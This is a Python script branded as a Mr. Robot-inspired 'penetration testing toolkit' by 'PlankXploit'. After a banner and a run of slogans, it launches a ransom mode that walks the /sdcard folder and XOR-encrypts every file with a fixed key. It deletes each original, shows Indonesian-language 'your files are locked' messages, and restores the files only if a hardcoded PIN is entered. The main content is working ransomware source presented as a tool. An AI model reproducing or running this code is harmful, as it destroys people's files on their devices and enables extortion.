
import sys, os, time, webbrowser

def slowprint(s, delay=0.1):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(delay)

def boot_sequence():
    os.system("clear")
    print("""\033[92m
=========================================================================
|                                                                       |
| ███╗   ███╗██████╗        ██████╗  ██████╗ ██████╗  ██████╗ ████████╗ |
| ████╗ ████║██╔══██╗       ██╔══██╗██╔═══██╗██╔══██╗██╔═══██╗╚══██╔══╝ |
| ██╔████╔██║██████╔╝       ██████╔╝██║   ██║██████╔╝██║   ██║   ██║    |
| ██║╚██╔╝██║██╔══██╗       ██╔══██╗██║   ██║██╔══██╗██║   ██║   ██║    |
| ██║ ╚═╝ ██║██║  ██║██╗    ██║  ██║╚██████╔╝██████╔╝╚██████╔╝   ██║    |
| ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝    ╚═╝  ╚═╝ ╚═════╝ ╚═════╝  ╚═════╝    ╚═╝    |
|      A Offensive Python Script, Inspired From This T.V. Series        |
|           * Github Page : https://github.com/PlankXploit *           |
=========================================================================
""")
    slowprint('\033[91m [*] F**K SOCIETY : A Penetration Testing ToolKit', 0.05)
    input("\n\033[97m [*] Enter To b00T\t")
    os.system("clear")

    messages = [
        "[*] Booting..... ",
        "\033[91m[*] Don't Misuse Your Power",
        "\033[97m[*] Humans Are Most Vulnerable",
        "\033[91m[*] Improve, Don't Prove",
        "\033[92m[*] Superpower Needs To Be Practiced",
        "\033[98m[*] Secuirity Is Just An Illusion",
        "\033[91m[*] With Some Great Power Comes Great Responsibility",
        "\033[92m[*] Be An Exception, Be An Example",
        "\033[93m[*] Accept Past, Move On",
        "\033[95m[*] Good Persons Are Always Got Misused",
        "\033[97m[*] Govt. Controls Our Media... Social Medias are fake",
        "\033[91m[*] Messing Up With Pride Is An Alltime Fool Decision",
        "\033[92m[*] Be An Example Before An Advisor",
        "\033[91m[*] Time Doesn't Heal Anything, We Just Got Habituated With Situation",
        "\033[93m[*] A Monster Is Better Than An Arrogant God",
        "\033[97m[*] Booting Completed :)"
    ]
    for msg in messages:
        slowprint(msg, 0.05)
        time.sleep(0.2)
    os.system("clear")

def ransom_mode():
    import base64
    FOLDER = "/sdcard"
    PIN = "04062007"
    KEY = 69

    def encrypt_file(path):
        with open(path, 'rb') as f:
            content = f.read()
        encrypted = bytes([b ^ KEY for b in content])
        with open(path + ".planklock", 'wb') as f:
            f.write(encrypted)
        os.remove(path)

    def decrypt_file(path):
        with open(path, 'rb') as f:
            content = f.read()
        decrypted = bytes([b ^ KEY for b in content])
        original_name = path.replace(".planklock", "")
        with open(original_name, 'wb') as f:
            f.write(decrypted)
        os.remove(path)

    print("\033[1;31m")
    print("""
██████╗ ██╗      █████╗ ███╗   ██╗██╗  ██╗██╗  ██╗██████╗ ██╗     ██╗████████╗
██╔══██╗██║     ██╔══██╗████╗  ██║██║ ██╔╝██║ ██╔╝██╔══██╗██║     ██║╚══██╔══╝
██████╔╝██║     ███████║██╔██╗ ██║█████╔╝ █████╔╝ ██████╔╝██║     ██║   ██║   
██╔═══╝ ██║     ██╔══██║██║╚██╗██║██╔═██╗ ██╔═██╗ ██╔═══╝ ██║     ██║   ██║   
██║     ███████╗██║  ██║██║ ╚████║██║  ██╗██║  ██╗██║     ███████╗██║   ██║   
╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝   ╚═╝   
        PLANKXPLOIT - YOUR FILES ARE LOCKED!
""")
    print("\n[!] Semua file anda telah dienkripsi.")
    print("[!] Masukkan PIN untuk membuka file.")

    for root, dirs, files in os.walk(FOLDER):
        for file in files:
            path = os.path.join(root, file)
            if not file.endswith(".planklock"):
                try:
                    encrypt_file(path)
                    print(f"[+] Encrypted: {path}")
                except:
                    continue

    pin_input = input("\nMasukkan PIN untuk dekripsi: ")
    if pin_input == PIN:
        print("\n[✓] PIN benar. Mendekripsi file...")
        for root, dirs, files in os.walk(FOLDER):
            for file in files:
                if file.endswith(".planklock"):
                    path = os.path.join(root, file)
                    try:
                        decrypt_file(path)
                        print(f"[✓] Decrypted: {path}")
                    except:
                        continue
        print("\n[✓] Semua file berhasil dikembalikan!")
    else:
        print("\n[×] PIN salah! File tetap terenkripsi.")

def main():
    try:
        boot_sequence()
        ransom_mode()
    except Exception as e:
        print(f"[!] Terjadi error: {e}")

if __name__ == "__main__":
    main()
